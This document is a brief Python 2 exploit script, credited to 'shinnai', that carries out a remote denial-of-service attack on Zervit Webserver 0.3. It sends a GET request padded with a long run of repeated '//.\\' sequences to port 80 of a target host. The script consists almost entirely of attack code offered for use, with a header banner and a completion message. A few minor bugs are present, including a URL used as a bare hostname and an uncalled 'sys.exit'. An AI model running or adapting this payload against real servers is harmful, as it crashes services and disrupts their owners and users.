import socket
import sys

print "------------------------------------------------------"
print " Zervit Webserver 0.3 Remote Denial Of Service        "
print " url: http://zervit.sourceforge.net                   "
print "                                                      "
print " author: shinnai                                      "
print " mail: shinnai[at]autistici[dot]org                   "
print " site: http://www.shinnai.net                         "
print "                                                      "
print " greets to: e.wiZz! for inspiration. Be safe man...   "
print "                                                      "
print " dedicated to: all those tried to own my site :-p     "
print "------------------------------------------------------"

host = "http://www.example.com"
port = 80

try:
       buff = "//.\\" * 330
       request =  "GET " + buff + " HTTP/1.0"
       connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       connection.connect((host, port))
       connection.send(request)
       raw_input('\n\nExploit completed. Press "Enter" to quit...')
       sys.exit
except:
       raw_input('\n\nUnable to connect. Press "Enter" to quit...')

